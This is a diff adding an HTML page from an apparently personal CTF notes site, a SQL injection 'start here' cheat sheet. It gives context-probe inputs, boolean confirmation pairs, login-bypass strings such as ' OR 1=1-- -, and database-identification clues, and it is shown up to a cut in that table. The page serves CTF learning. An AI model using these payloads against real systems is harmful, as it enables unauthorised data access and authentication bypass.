@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="SQL Injection — Start Here Order: establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.
+1. What does your input sit inside? Possible original query Try as the input Why WHERE id = INPUT 1 AND 1=1 / 1 AND 1=2 Numeric expression needs no quote WHERE name = &#39;INPUT&#39; apple&#39; AND &#39;1&#39;=&#39;1 / apple&#39; AND &#39;1&#39;=&#39;2 Preserve the original closing quote WHERE name = &#39;INPUT&#39; apple&#39; AND 1=1-- - / apple&#39; AND 1=2-- - Comment out the remaining query WHERE name LIKE &#39;%INPUT%&#39; apple%&#39; AND 1=1-- - / apple%&#39; AND 1=2-- - Close the wildcard string WHERE (name = &#39;INPUT&#39;) apple&#39;) AND 1=1-- - / apple&#39;) AND 1=2-- - Close the parenthesis too ORDER BY INPUT 1, 2, 999 Identifier/expression position, not a quoted value Choose apple / 1 to match an existing row. An AND test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/web-expl/sqli/">
+  <meta property="og:site_name" content="offsec-n0t3">
+  <meta property="og:title" content="01 · SQLi — Start Here">
+  <meta property="og:description" content="SQL Injection — Start Here Order: establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.
+1. What does your input sit inside? Possible original query Try as the input Why WHERE id = INPUT 1 AND 1=1 / 1 AND 1=2 Numeric expression needs no quote WHERE name = &#39;INPUT&#39; apple&#39; AND &#39;1&#39;=&#39;1 / apple&#39; AND &#39;1&#39;=&#39;2 Preserve the original closing quote WHERE name = &#39;INPUT&#39; apple&#39; AND 1=1-- - / apple&#39; AND 1=2-- - Comment out the remaining query WHERE name LIKE &#39;%INPUT%&#39; apple%&#39; AND 1=1-- - / apple%&#39; AND 1=2-- - Close the wildcard string WHERE (name = &#39;INPUT&#39;) apple&#39;) AND 1=1-- - / apple&#39;) AND 1=2-- - Close the parenthesis too ORDER BY INPUT 1, 2, 999 Identifier/expression position, not a quoted value Choose apple / 1 to match an existing row. An AND test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="01 · SQLi — Start Here">
+  <meta itemprop="description" content="SQL Injection — Start Here Order: establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.
+1. What does your input sit inside? Possible original query Try as the input Why WHERE id = INPUT 1 AND 1=1 / 1 AND 1=2 Numeric expression needs no quote WHERE name = &#39;INPUT&#39; apple&#39; AND &#39;1&#39;=&#39;1 / apple&#39; AND &#39;1&#39;=&#39;2 Preserve the original closing quote WHERE name = &#39;INPUT&#39; apple&#39; AND 1=1-- - / apple&#39; AND 1=2-- - Comment out the remaining query WHERE name LIKE &#39;%INPUT%&#39; apple%&#39; AND 1=1-- - / apple%&#39; AND 1=2-- - Close the wildcard string WHERE (name = &#39;INPUT&#39;) apple&#39;) AND 1=1-- - / apple&#39;) AND 1=2-- - Close the parenthesis too ORDER BY INPUT 1, 2, 999 Identifier/expression position, not a quoted value Choose apple / 1 to match an existing row. An AND test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.">
+  <meta itemprop="wordCount" content="988">
+
+<title>01 · SQLi — Start Here • offsec-n0t3</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/web-expl/sqli/">
+<link rel="stylesheet" href="/book.min.6a186488aa2758244308597fd301e13ded2a0fdc5af91968a34aa403893bf539.css" integrity="sha256-ahhkiKonWCRDCFl/0wHhPe0qD9xa&#43;Rloo0qkA4k79Tk=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.6641e65073282cb36eef05cedef40c45da2ae0b4450909d47bde09f2d8432c67.js" integrity="sha256-ZkHmUHMoLLNu7wXO3vQMRdoq4LRFCQnUe94J8thDLGc=" crossorigin="anonymous"></script>
+  <meta name="theme-color" content="#252637">
+
+<script defer src="/fieldbook.min.04e65c4f438e6e13ced1f07c11e88ce2991776fff8f8dab5afe6834a7cd40d67.js" integrity="sha256-BOZcT0OObhPO0fB8EeiM4pkXdv/4&#43;Nq1r&#43;aDSnzUDWc="></script>
+<link rel="icon" href="/images/fieldmark.svg" type="image/svg+xml">
+
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<a class="field-brand" href="/" aria-label="offsec-n0t3 home">
+  <span class="brand-sigil" aria-hidden="true">忍</span>
+  <span><strong>offsec<span class="brand-accent">-n0t3</span></strong><small>CTF NOTES / OPEN BOOK</small></span>
+</a>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+<div class="nav-caption">FIELD DIRECTORY <span aria-hidden="true">↙</span></div>
+<a class="directory-home" href="/docs/">⌂ &nbsp; All fieldnotes</a>
+
+
+
+
+
+
+<ul class="field-tree">
+  
+  
+  <li class="field-tree-section" data-collection="web">
+    <details open>
+      <summary><span>Web Exploitation</span><span class="tree-count">32</span></summary>
+      <ul><li><a href="/docs/web-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/web-expl/methodology/" class="" >00 · First 10 Minutes</a></li>
+
+<li><a href="/docs/web-expl/sqli/" class="active" aria-current="page">01 · SQLi — Start Here</a></li>
+
+<li><a href="/docs/web-expl/sqli-mysql/" class="" >02 · SQLi — MySQL / MariaDB</a></li>
+
+<li><a href="/docs/web-expl/sqli-postgresql/" class="" >03 · SQLi — PostgreSQL</a></li>
+
+<li><a href="/docs/web-expl/sqli-sqlite/" class="" >04 · SQLi — SQLite</a></li>
+
+<li><a href="/docs/web-expl/sqli-mssql/" class="" >05 · SQLi — SQL Server</a></li>
+
+<li><a href="/docs/web-expl/sqli-oracle/" class="" >06 · SQLi — Oracle</a></li>
+
+<li><a href="/docs/web-expl/sqli-blind/" class="" >07 · SQLi — Blind / Error</a></li>
+
+<li><a href="/docs/web-expl/source-disclosure/" class="" >08 · Source / Backup Leaks</a></li>
+
+<li><a href="/docs/web-expl/ssti/" class="" >SSTI · Identify the Engine First</a></li>
+
+<li><a href="/docs/web-expl/nosqli/" class="" >NoSQL Injection · Operators &amp; Blind Reads</a></li>
+
+<li><a href="/docs/web-expl/xss/" class="" >XSS · Context Before Payload</a></li>
+
+<li><a href="/docs/web-expl/auth-idor/" class="" >Auth &amp; IDOR · Compare Two Accounts</a></li>
+
+<li><a href="/docs/web-expl/jwt/" class="" >JWT · Claims, Algorithms &amp; Keys</a></li>
+
+<li><a href="/docs/web-expl/oauth/" class="" >OAuth / Account Linking</a></li>
+
+<li><a href="/docs/web-expl/prototype-pollution/" class="" >Prototype Pollution · Source to Gadget</a></li>
+
+<li><a href="/docs/web-expl/graphql/" class="" >GraphQL · Schema to Resolver</a></li>
+
+<li><a href="/docs/web-expl/csrf-cors/" class="" >CSRF &amp; CORS · Send vs Read</a></li>
+
+<li><a href="/docs/web-expl/websockets/" class="" >WebSockets / Live Sessions</a></li>
+
+<li><a href="/docs/web-expl/command-injection/" class="" >Command Injection</a></li>
+
+<li><a href="/docs/web-expl/lfi-traversal/" class="" >Traversal &amp; LFI</a></li>
+
+<li><a href="/docs/web-expl/ssrf/" class="" >SSRF</a></li>
+
+<li><a href="/docs/web-expl/xxe/" class="" >XXE &amp; XML Parsers</a></li>
+
+<li><a href="/docs/web-expl/file-upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/web-expl/deserialization/" class="" >Deserialization</a></li>
+
+<li><a href="/docs/web-expl/business-logic/" class="" >Business Logic &amp; Races</a></li>
+
+<li><a href="/docs/web-expl/http-cache/" class="" >HTTP, Cache &amp; Smuggling</a></li>
+
+<li><a href="/docs/web-expl/php-quirks/" class="" >PHP · Types / Hashes / Parsers</a></li>
+
+<li><a href="/docs/web-expl/ldap-xpath/" class="" >LDAP / XPath Injection</a></li>
+
+<li><a href="/docs/web-expl/open-redirect/" class="" >Open Redirect / URL Parsing</a></li>
+
+<li><a href="/docs/web-expl/encoding-filters/" class="" >Encoding &amp; Filter Bypasses</a></li>
+
+<li><a href="/docs/web-expl/python-snippets/" class="" >Python · Reusable Web Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="network">
+    <details >
+      <summary><span>Network Exploitation</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/network-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/network-expl/packet-triage/" class="" >01 · Packet Triage</a></li>
+
+<li><a href="/docs/network-expl/http-streams/" class="" >02 · HTTP / File Streams</a></li>
+
+<li><a href="/docs/network-expl/dns/" class="" >03 · DNS / Encoded Labels</a></li>
+
+<li><a href="/docs/network-expl/tls-ssh/" class="" >04 · TLS / SSH</a></li>
+
+<li><a href="/docs/network-expl/tcp-udp/" class="" >05 · TCP / UDP Sessions</a></li>
+
+<li><a href="/docs/network-expl/wifi/" class="" >06 · Wi-Fi Capture Analysis</a></li>
+
+<li><a href="/docs/network-expl/can-bus/" class="" >07 · CAN / Cannelloni</a></li>
+
+<li><a href="/docs/network-expl/protocols/" class="" >08 · FTP / Mail / ICMP / SMB</a></li>
+
+<li><a href="/docs/network-expl/python-snippets/" class="" >09 · Python / Ready Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="stego">
+    <details >
+      <summary><span>Steganography</span><span class="tree-count">8</span></summary>
+      <ul><li><a href="/docs/steganograph-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/steganograph-expl/triage/" class="" >First 10 Minutes</a></li>
+
+<li><a href="/docs/steganograph-expl/images-lsb/" class="" >Images: LSB &amp; Bit Planes</a></li>
+
+<li><a href="/docs/steganograph-expl/png-jpeg/" class="" >PNG &amp; JPEG Structure</a></li>
+
+<li><a href="/docs/steganograph-expl/archives-carving/" class="" >Archives &amp; File Carving</a></li>
+
+<li><a href="/docs/steganograph-expl/audio/" class="" >Audio: Samples &amp; Spectrograms</a></li>
+
+<li><a href="/docs/steganograph-expl/pdf-documents/" class="" >PDF &amp; Office Documents</a></li>
+
+<li><a href="/docs/steganograph-expl/text-unicode/" class="" >Text, Whitespace &amp; Unicode</a></li>
+
+<li><a href="/docs/steganograph-expl/python-snippets/" class="" >Offline Python Toolkit</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="reversing">
+    <details >
+      <summary><span>Reverse Engineering</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/reversing-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/reversing-expl/triage/" class="" >Triage · First Five Minutes</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-cheatsheet/" class="" >Ghidra Cheatsheet · From Strings to Check</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-plugins/" class="" >Ghidra Plugins · Built-ins &amp; Offline Extras</a></li>
+
+<li><a href="/docs/reversing-expl/static-analysis/" class="" >Static Analysis · Bytes, Types &amp; Control Flow</a></li>
+
+<li><a href="/docs/reversing-expl/dynamic-debugging/" class="" >Dynamic Debugging · Break, Inspect, Dump</a></li>
+
+<li><a href="/docs/reversing-expl/strings-encodings/" class="" >Strings &amp; Encodings · Preserve the Bytes</a></li>
+
+<li><a href="/docs/reversing-expl/crypto-obfuscation/" class="" >Crypto &amp; Obfuscation · Identify, Model, Verify</a></li>
+
+<li><a href="/docs/reversing-expl/dotnet/" class="" >.NET · dnSpyEx, Resources &amp; IL</a></li>
+
+<li><a href="/docs/reversing-expl/python-snippets/" class="" >Python Snippets · Byte Workbench &amp; Check Models</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="tools">
+    <details >
+      <summary><span>Tools · Visual Cheatsheets</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/tools-cheatsheet/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/tools-cheatsheet/cyberchef-cheatsheet/" class="" >CyberChef · Visual Recipes</a></li>
+
+<li><a href="/docs/tools-cheatsheet/approved-tools-map/" class="" >39 Tools · Technique Map</a></li>
+
+<li><a href="/docs/tools-cheatsheet/python-library/" class="" >Python · Offline Snippet Library</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li><a href="/docs/cli_cheatsheet/" class="">CLI Cheatsheet</a></li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="pico">
+    <details >
+      <summary><span>picoCTF</span><span class="tree-count">4</span></summary>
+      <ul><li><a href="/docs/picoctf/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><details ><summary>Rev</summary><ul><li><a href="/docs/picoctf/rev/">Overview ↗</a></li>
+
+</ul></details></li>
+
+<li><details ><summary>Web</summary><ul><li><a href="/docs/picoctf/web/">Overview ↗</a></li>
+
+<li><a href="/docs/picoctf/web/file_upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/picoctf/web/ip_bypassing/" class="" >Proxy Mnipu</a></li>
+
+<li><a href="/docs/picoctf/web/sqli/" class="" >Sqli</a></li>
+
+<li><a href="/docs/picoctf/web/eval_ssti/" class="" >SSTI</a></li>
+
+</ul></details></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="scripts">
+    <details >
+      <summary><span>Scripts</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/scripts/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/scripts/brute_force_py/" class="" >Brute Force Py</a></li>
+
+<li><a href="/docs/scripts/craft_img_py/" class="" >Craft Img Py</a></li>
+
+<li><a href="/docs/scripts/lro_rlo_fileext/" class="" >Lro Rlo File Ext</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="windows">
+    <details >
+      <summary><span>Windows Rev</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/windows_rev/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/windows_rev/arc4_decrypt/" class="" >Arc4 Decrypt</a></li>
+
+<li><a href="/docs/windows_rev/dmp_hunt4c2/" class="" >Dmp Hunt4c2</a></li>
+
+<li><a href="/docs/windows_rev/x64dbg_cheatsheet/" class="" >X64dbg Cheatsheet</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="approved">
+    <details >
+      <summary><span>AJCBBC Allowed Tools</span><span class="tree-count">39</span></summary>
+      <ul><li><a href="/docs/ajcbbc_allow_tools/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/ajcbbc_allow_tools/cyberchef/" class="" >CyberChef</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wireshark/" class="" >Wireshark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdf_viewer/" class="" >PDF Viewer</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openvpn_client/" class="" >OpenVPN Client</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/google_chrome/" class="" >Google Chrome</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wsl/" class="" >Windows Subsystem for Linux (WSL)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/python3/" class="" >Python 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/uv/" class="" >uv</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/gdb/" class="" >gdb</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/objdump/" class="" >objdump</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/strings/" class="" >strings</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zsteg/" class="" >zsteg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/binwalk/" class="" >binwalk</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/exiftool/" class="" >ExifTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdftotext/" class="" >pdftotext (Poppler utils)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/can_utils/" class="" >can-utils</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/cannelloni/" class="" >cannelloni</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zeek/" class="" >Zeek</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zbar/" class="" >ZBar</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/burp_suite_community/" class="" >Burp Suite Community Edition</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/jq/" class="" >jq</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/ghidra/" class="" >Ghidra</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/sleuth_kit/" class="" >The Sleuth Kit</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssl/" class="" >OpenSSL</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xz/" class="" >xz</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/qpdf/" class="" >qpdf</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/llvm_mc/" class="" >llvm-mc (LLVM tools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xxd/" class="" >xxd</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/fsck_fat/" class="" >fsck.fat (dosfstools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/rsactftool/" class="" >RsaCtfTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/volatility3/" class="" >Volatility 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssh_session_key_recovery/" class="" >OpenSSH-Session-Key-Recovery</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/x64dbg/" class="" >x64dbg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/autopsy/" class="" >Autopsy</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/hxd/" class="" >HxD</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/tshark/" class="" >TShark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/notepad_plus_plus/" class="" >Notepad&#43;&#43;</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/dnspyex/" class="" >dnSpyEx (dnSpy)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/eric_zimmerman_tools/" class="" >Eric Zimmerman&#39;s Tools</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+</ul>
+
+
+
+
+
+
+
+<div class="nav-footer"><span class="status-dot" aria-hidden="true"></span> OFFLINE / PERSONAL NOTES<br><span>Payloads · methods · worked examples</span></div>
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>01 · SQLi — Start Here</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-what-does-your-input-sit-inside">1. What does your input sit inside?</a></li>
+    <li><a href="#2-confirm-injection">2. Confirm injection</a>
+      <ul>
+        <li><a href="#numeric-value">Numeric value</a></li>
+        <li><a href="#single-quoted-string">Single-quoted string</a></li>
+        <li><a href="#authentication-query-if-the-challenge-gate-is-a-vulnerable-login">Authentication query, if the challenge gate is a vulnerable login</a></li>
+        <li><a href="#comment-syntax">Comment syntax</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-identify-the-database">3. Identify the database</a></li>
+    <li><a href="#4-does-the-query-return-rows-into-the-response">4. Does the query return rows into the response?</a>
+      <ul>
+        <li><a href="#count-selected-columns">Count selected columns</a></li>
+        <li><a href="#find-a-displayed-text-compatible-column">Find a displayed text-compatible column</a></li>
+        <li><a href="#put-the-engine-expression-in-that-position">Put the engine expression in that position</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-no-visible-output">5. No visible output?</a></li>
+    <li><a href="#6-nonstandard-insertion-points">6. Nonstandard insertion points</a>
+      <ul>
+        <li><a href="#order-by">ORDER BY</a></li>
+        <li><a href="#like-wildcard-behavior">LIKE wildcard behavior</a></li>
+        <li><a href="#second-order">Second order</a></li>
+      </ul>
+    </li>
+    <li><a href="#if-the-payload-fails">If the payload fails</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      <div id="field-content" tabindex="-1"></div>
+
+<div class="page-topline" data-collection="web"><nav aria-label="Breadcrumb"><a href="/docs/">NOTEBOOK</a><span>/</span><a href="/docs/web-expl/">Web Exploitation</a></nav><span>5 MIN READ</span></div>
+
+
+
+      
+  <article class="markdown book-article"><h1 id="sql-injection--start-here">SQL Injection — Start Here<a class="anchor" href="#sql-injection--start-here"></a></h1>
+<p><strong>Order:</strong> establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.</p>
+<h2 id="1-what-does-your-input-sit-inside">1. What does your input sit inside?<a class="anchor" href="#1-what-does-your-input-sit-inside"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Possible original query</th>
+          <th>Try as the input</th>
+          <th>Why</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>WHERE id = INPUT</code></td>
+          <td><code>1 AND 1=1</code> / <code>1 AND 1=2</code></td>
+          <td>Numeric expression needs no quote</td>
+      </tr>
+      <tr>
+          <td><code>WHERE name = 'INPUT'</code></td>
+          <td><code>apple' AND '1'='1</code> / <code>apple' AND '1'='2</code></td>
+          <td>Preserve the original closing quote</td>
+      </tr>
+      <tr>
+          <td><code>WHERE name = 'INPUT'</code></td>
+          <td><code>apple' AND 1=1-- -</code> / <code>apple' AND 1=2-- -</code></td>
+          <td>Comment out the remaining query</td>
+      </tr>
+      <tr>
+          <td><code>WHERE name LIKE '%INPUT%'</code></td>
+          <td><code>apple%' AND 1=1-- -</code> / <code>apple%' AND 1=2-- -</code></td>
+          <td>Close the wildcard string</td>
+      </tr>
+      <tr>
+          <td><code>WHERE (name = 'INPUT')</code></td>
+          <td><code>apple') AND 1=1-- -</code> / <code>apple') AND 1=2-- -</code></td>
+          <td>Close the parenthesis too</td>
+      </tr>
+      <tr>
+          <td><code>ORDER BY INPUT</code></td>
+          <td><code>1</code>, <code>2</code>, <code>999</code></td>
+          <td>Identifier/expression position, not a quoted value</td>
+      </tr>
+  </tbody>
+</table>
+<p>Choose <code>apple</code> / <code>1</code> to match an existing row. An <code>AND</code> test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.</p>
+<p>Small quote probes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39;
+</span></span><span style="display:flex;"><span>&#39;&#39;
+</span></span><span style="display:flex;"><span>&#34;
+</span></span><span style="display:flex;"><span>1&#39;
+</span></span><span style="display:flex;"><span>1&#39;)
+</span></span><span style="display:flex;"><span>1&#39;))</span></span></code></pre></div><p>One error is inconclusive. A quote error followed by a syntax repair is useful evidence, but escaping/validation can also create differences. Confirm with a boolean pair.</p>
+<h2 id="2-confirm-injection">2. Confirm injection<a class="anchor" href="#2-confirm-injection"></a></h2>
+<h3 id="numeric-value">Numeric value<a class="anchor" href="#numeric-value"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#b48ead">7</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">7</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#b48ead">7</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">8</span></span></span></code></pre></div><h3 id="single-quoted-string">Single-quoted string<a class="anchor" href="#single-quoted-string"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>apple<span style="color:#a3be8c">&#39; AND 7=7-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">apple&#39;</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#b48ead">7</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">8</span><span style="color:#616e87;font-style:italic">-- -</span></span></span></code></pre></div><h3 id="authentication-query-if-the-challenge-gate-is-a-vulnerable-login">Authentication query, if the challenge gate is a vulnerable login<a class="anchor" href="#authentication-query-if-the-challenge-gate-is-a-vulnerable-login"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">admin</span><span style="color:#a3be8c">&#39;-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">&#39;</span> <span style="color:#81a1c1;font-weight:bold">OR</span> <span style="color:#b48ead">1</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">1</span><span style="color:#616e87;font-style:italic">-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">&#39; OR &#39;</span>a<span style="color:#a3be8c">&#39;=&#39;</span>a<span style="color:#a3be8c">&#39;-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">&#39;</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">OR</span> <span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;a&#39;</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;a&#39;</span><span style="color:#eceff4">)</span><span style="color:#616e87;font-style:italic">-- -</span></span></span></code></pre></div><p>These bypass only certain query shapes. They do not bypass password verification performed separately after fetching a user, and an <code>OR</code> may select an arbitrary user. Confirm the actual account/role after login.</p>
+<h3 id="comment-syntax">Comment syntax<a class="anchor" href="#comment-syntax"></a></h3>
+<table>
+  <thead>
+      <tr>
+          <th>Engine</th>
+          <th>Comments</th>
+          <th>Caveat</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>MySQL / MariaDB</td>
+          <td><code>-- </code>, <code>#</code>, <code>/* ... */</code></td>
+          <td><code>--</code> needs following whitespace/control; use <code>-- -</code></td>
+      </tr>
+      <tr>
+          <td>PostgreSQL</td>
+          <td><code>--</code>, <code>/* ... */</code></td>
+          <td>No MySQL <code>#</code> comment</td>
+      </tr>
+      <tr>
+          <td>SQLite</td>
+          <td><code>--</code>, <code>/* ... */</code></td>
+          <td>A driver can restrict statement count</td>
+      </tr>
+      <tr>
+          <td>SQL Server</td>
+          <td><code>--</code>, <code>/* ... */</code></td>
+          <td>Types matter in UNION</td>
+      </tr>
+      <tr>
+          <td>Oracle</td>
+          <td><code>--</code>, <code>/* ... */</code></td>
+          <td>Traditional UNION probes use <code>FROM dual</code></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="3-identify-the-database">3. Identify the database<a class="anchor" href="#3-identify-the-database"></a></h2>
+<p>Use <strong>errors + a matching function + stack/source evidence</strong>. A function failure can be caused by the wrong SQL context; never decide from one generic <code>500</code>.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Error clue</th>
+          <th>Likely engine</th>
+          <th>Expression to retrieve in a working output slot</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>You have an error in your SQL syntax</code>, <code>MariaDB</code>, <code>mysqli</code></td>
+          <td>MySQL / MariaDB</td>
+          <td><code>VERSION()</code> and <code>DATABASE()</code></td>
+      </tr>
+      <tr>
+          <td><code>PostgreSQL</code>, <code>pg_query</code>, <code>unterminated quoted string</code>, <code>SQLSTATE 42601</code></td>
+          <td>PostgreSQL</td>
+          <td><code>version()</code> and <code>current_database()</code></td>
